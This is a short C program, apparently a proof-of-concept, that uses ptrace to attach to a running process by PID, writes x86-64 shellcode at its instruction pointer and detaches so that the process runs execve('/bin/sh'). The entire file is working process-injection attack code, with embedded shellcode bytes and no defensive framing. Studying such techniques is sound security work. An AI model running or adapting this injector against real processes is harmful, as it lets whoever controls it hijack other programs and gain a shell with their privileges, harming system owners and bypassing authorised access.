//yaspr - 2020
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>

#define SHELLCODE_SIZE 32

unsigned char shellcode[] = 
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";

int inject_data(pid_t pid, unsigned char *src, void *dst, int len)
{
  uint32_t *s = (uint32_t *)src;
  uint32_t *d = (uint32_t *)dst;
  
  for (int i = 0; i < len; i += 4, s++, d++)
    if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0)
      {
	perror("ptrace(POKETEXT):");
	return -1;
      }
  
  return 0;
}

int main(int argc, char **argv)
{
  struct user_regs_struct regs;
  pid_t                   target;
  
  if (argc != 2)
    {
      fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit(1);
    }
  
  target = atoi(argv[1]);

  printf("# Tracing process %d\n", target);
  
  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror("ptrace(ATTACH)");
      exit(1);
    }
  
  printf("# Waiting for process...\n");
  wait(NULL);
  
  printf("# Getting Registers\n");
  if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror("ptrace(GETREGS)");
      exit(1);
    }
  
  printf("# Injecting shellcode at %p\n", (void*)regs.rip);
  
  inject_data(target, shellcode, (void *)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;
  
  printf("# Setting IP to %p\n", (void *)regs.rip);

  if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror("ptrace(GETREGS)");
      exit(1);
    }
  
  printf("# Shell!\n");
  
  if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0)
    {
      perror("ptrace(DETACH)");
      exit(1);
    }
  
  return 0;
}
